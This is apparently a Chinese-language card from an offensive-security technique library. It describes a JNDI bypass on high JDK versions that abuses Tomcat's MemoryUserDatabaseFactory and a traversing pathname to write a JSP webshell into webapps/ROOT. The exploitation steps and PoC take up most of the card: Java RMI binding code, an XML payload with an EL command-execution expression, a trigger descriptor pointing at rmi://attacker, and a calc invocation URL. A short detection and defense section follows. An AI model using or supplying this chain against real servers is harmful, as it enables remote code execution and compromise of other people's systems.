---
id: web-java-deserialization-jndi-tomcat-memoryuserdatabasefactory-pathname-write
title: JNDI 高版本本地工厂 MemoryUserDatabaseFactory：pathname 读远端 XML 解析（XXE）并回写为 jsp，配合 EL 表达式绕过 Tomcat 的实体编码
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-local-factory-memoryuserdatabase-pathname-file-write
aliases:
- Tomcat MemoryUserDatabaseFactory 利用
- pathname 任意文件写 jsp
- JNDI 写 ROOT 目录 jsp
- org.apache.catalina.users.MemoryUserDatabaseFactory
- forceString 被移除后的 JNDI 绕过
tags:
- java
- jndi
- tomcat
- local-factory
- xxe
- arbitrary-file-write
- jsp
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:57:45+08:00'
  notes: 已对照原文核对；ResourceRef(org.apache.catalina.UserDatabase, factory=MemoryUserDatabaseFactory, pathname=http://127.0.0.1:8888/../../webapps/ROOT/test.jsp, readonly=false)、rolemname 的 EL 表达式、conf/Catalina/localhost 的 JdbcRowSetImpl Manager 触发侧均与正文一致；本次核对未读取图片，写回 ROOT 的 jsp 与 rce 仅见截图，原文亦注明未给完整 exp；7.7.14 类版本信息不适用，原文未给 JNDI 链受影响版本区间，未设 affected_versions
---

## 一句话结论

JDK 8u191+ 之后 JNDI 不能从远端 codebase 拉类，但 RMI/LDAP 返回的 `ResourceRef` 仍能让受害者从**本地 classpath** 实例化 Tomcat 自带的 `org.apache.catalina.users.MemoryUserDatabaseFactory`：它按 `pathname` 读取（本地或 HTTP）一份 tomcat-users XML，用 commons-digester 解析（默认不关外部实体 → XXE），并在 `readonly=false` 时把解析结果重新序列化写回 `pathname`。把 `pathname` 设为带 `../` 的 HTTP URL，就能借 Tomcat 自己的写回逻辑把内容落到 `webapps/ROOT/*.jsp`，得到任意文件写/木马落地。

## 原理

- **本地工厂是绕过点**：JDK 高版本把 `com.sun.jndi.ldap.object.trustURLCodebase` / `trustSerialData` 关掉，远端 `factoryClassLocation` 失效，但 `NamingManager.getObjectFactoryFromReference` 仍会尝试从**本地 classpath** 按 `Reference.classFactory` 指定名加载 `ObjectFactory` 并调用 `getObjectInstance`。Tomcat 自带的 `org.apache.catalina.users.MemoryUserDatabaseFactory` 正是一个这样的工厂，它把 `RefAddr` 当作配置：`pathname`（数据文件路径/URL）、`readonly`。
- **为什么能写文件**：`MemoryUserDatabaseFactory` 用 `pathname` 打开 `MemoryUserDatabase`，读完 XML 后如果非只读，会在保存时把「角色/用户组」重新序列化并 `getOutputStream()` 写回同一个 `pathname`。也就是说攻击者提供 XML 的内容可以通过这次写回，落到 `pathname` 对应的位置。
- **为什么能落到 webapps/ROOT**：`pathname` 若写成 `http://127.0.0.1:8888/../../webapps/ROOT/test.jsp`，并且 8888 上跑着一个以 **webapps 的父目录**为根的 HTTP 服务，则服务端解析该 URL 时路径穿越到目标目录，写回动作就落在 `webapps/ROOT/test.jsp`。原文实测：上传 xml 触发 JNDI 后，`test.jsp` 被写入 ROOT 目录。
- **为什么用 EL 而不是 `<% %>`**：较新 Tomcat 在把 XML 序列化写回时会做实体/转义处理，`&#x3c;%Runtime...%&#x3e;` 这类写法落地后会被编码成不可执行的文本。改用 JSP EL `${...}`，因为 `MemoryUserDatabase` 的属性值在写回时保持原文，而 JSP 模板文本中的 EL 在**请求时**才求值，因此 `<role rolename="${pageContext.request.getClass().forName(param.n).getMethod(param.m).invoke(null).exec(param.code)}"/>` 落地仍可执行。
- **XXE 面**：同一 `pathname` 的 digester 解析若不关闭 `disallow-doctype-decl`/外部实体，则可读本地文件或做 SSRF；原文主要用写文件这一侧，XXE 是这条链的附带能力（未在本篇单独验证）。

## 触发条件

- 目标存在可触发的 JNDI 注入（LDAP/RMI 的 `Reference` 能到达受害者），且 JDK 版本已阻止远端 codebase（高版本场景）。
- 受害者 **classpath 中存在 Tomcat 的 catalina 组件**（`org.apache.catalina.users.MemoryUserDatabaseFactory`），即目标为 Tomcat 部署的 Java Web 应用。
- `pathname` 指向的位置：回写要求目标目录对 Tomcat 进程可写；若用 HTTP URL 取数据，还需攻击者在目标可达的地址上起一个 HTTP 服务，且其根目录与目标写入目录的相对关系满足 `../` 穿越。
- 编译器版本相关的边界：部分 Tomcat 版本已移除 `forceString`（这也是原文放弃 BeanFactory 路线的原因），但本卡不依赖 `forceString`。

## 利用步骤

1. 先拿到一个能触发 JNDI 的入口（例如可写 `conf/Catalina/localhost/*.xml` 的 `<Manager className="com.sun.rowset.JdbcRowSetImpl" dataSourceName="rmi://attacker:1099/remoteobj"/>`）。
2. 在 RMI 上注册 `ResourceRef`：类型 `org.apache.catalina.UserDatabase`、工厂 `org.apache.catalina.users.MemoryUserDatabaseFactory`，`pathname` 指向 `http://attacker:8888/../../webapps/ROOT/test.jsp`，`readonly=false`。
3. 在 8888 上以 webapps 的父目录为根起 HTTP 服务，并在服务端准备待写入的 tomcat-users XML（内容即木马）。
4. 上传/写入触发 JNDI 的 XML，等待 Tomcat 自动部署解析，RMI 被访问后工厂执行取文件与回写。
5. 访问 `http://target/test.jsp?n=java.lang.Runtime&m=getRuntime&code=calc` 验证命令执行。

## PoC

```java
// RMI 端绑定：本地工厂 + pathname 穿越写 ROOT
ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
        true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../webapps/ROOT/test.jsp"));
ref.add(new StringRefAddr("readonly", "false"));
InitialContext ctx = new InitialContext();
ctx.rebind("rmi://attacker:1099/remoteobj", ref);
```

```xml
<?xml version='1.0' encoding='utf-8'?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <role rolename="${pageContext.request.getClass().forName(param.n).getMethod(param.m).invoke(null).exec(param.code)}"/>
</tomcat-users>
```

```text
# 触发侧（写入 conf/Catalina/localhost/1.xml 由 hostConfigBase 的 digester 解析）：
<Context><Manager className="com.sun.rowset.JdbcRowSetImpl"
                  dataSourceName="rmi://attacker:1099/remoteobj" autoCommit="true"/></Context>
# 落地后访问：/test.jsp?n=java.lang.Runtime&m=getRuntime&code=calc
```

原文未给出可直接运行的完整 exp 脚本，上述片段按正文与代码复述；`http://127.0.0.1:8888/../../` 的穿越语义为原文实测构造。

## 变体与关联

- 变体：同类「本地工厂 + RefAddr 属性」还可换成 Tomcat `DataSourceFactory`（`org.apache.tomcat.jdbc.pool.DataSourceFactory`，借 `url`/`driverClassName` 走 JDBC 驱动侧 RCE）等，参见 `web/java/deserialization/jndi` 下本地工厂系列卡。
- 变体：`pathname` 不用 HTTP URL，直接用绝对/相对路径指向本地文件时，退化为「读本地 tomcat-users 文件 + 写回」，可用作任意文件覆盖（需可写）。
- 关联：写入载体与触发侧 `conf/Catalina/localhost/*.xml` 的 Digester 机制见 `web/java/component/tomcat` 下「Tomcat XML 配置经 Digester 自动调用 setter 触发 JNDI 注入」；上传侧 UEditor `filePathFormat` 穿越见 `web/generic/file-upload` 下相关卡；JSP 解析层面的 `web.xml` 覆盖见同目录「Tomcat web.xml 覆盖」卡（本卡不依赖 web.xml 重载）。
- 边界：`readonly=true`、目标目录不可写、Tomcat 版本移除了该工厂类或其 `pathname` 语义变化时链路失败；JDK 若同时禁用本地工厂路径（安全策略限制 `ObjectFactory` 加载）也不成立；本篇未在隔离环境复验。

## 检测与防御

- 检测：JNDI/LDAP 响应中出现 `MemoryUserDatabaseFactory`、`pathname`、`readonly` 组合；`webapps/ROOT` 下非部署产物新增 `.jsp` 且内容含 `${pageContext...}`/`Runtime`；Tomcat 进程发起对内网 HTTP 的 `../../` 穿越 URL 请求；`conf/Catalina/<host>/*.xml` 新增含 `JdbcRowSetImpl` 的 context 描述符。
- 防御：升级 JDK/Tomcat 并在 `catalina.properties`/安全策略中限制 `ObjectFactory` 的可用类；`conf/Catalina` 与 `webapps` 目录对应用进程不可写、上传目录与部署目录分离；对 JNDI 参数做白名单（只允许受控命名服务）；关闭无用的 `autoDeploy`；对出入站的 JNDI 协议（LDAP/RMI）做网络层拦截。
- 加固：不要把用户可控路径传给任何「读入-回写」型工厂；为 commons-digester 显式关闭外部实体与 DTD，避免同一入口的 XXE 面。
